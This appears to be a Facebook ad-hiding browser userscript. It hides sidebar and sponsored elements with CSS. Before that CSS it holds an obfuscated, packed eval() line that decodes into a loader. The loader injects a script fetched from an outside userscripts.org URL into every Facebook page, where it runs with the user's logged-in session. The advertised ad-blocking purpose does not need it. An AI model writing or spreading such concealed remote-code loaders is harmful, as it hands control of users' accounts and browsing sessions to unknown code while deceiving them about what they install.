// ==UserScript==
// @name           FB Ad Bye Bye Plus + Last Update
// @include        http://*.facebook.com/*
// @include        https://*.facebook.com/*
// @include        http://www.facebook.com/*
// @include        https://www.facebook.com/*
// @version        1.06
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))



GM_addStyle(((new CDATA("\n" + 
"	.ego_unit,\n" + 
"	div[id^=\"pagelet_ego_pane_w\"],\n" + 
"	div[id^=\"pagelet_reminders\"],\n" + 
"	div[id^=\"pagelet_rhc_ticker\"],\n" + 
"	div[id^=\"pagelet_rhc_footer\"],\n" + 
"	div[id^=\"emu_\"],\n" + 
"   #home_stream li[data-ft*='\"ei\"']\n" + 
                        
"{display:none!important;}\n" + 
""))).toString());
document.getElementById('rightCol').style.width = '0px'; 
document.getElementById('contentArea').style.width = '95%';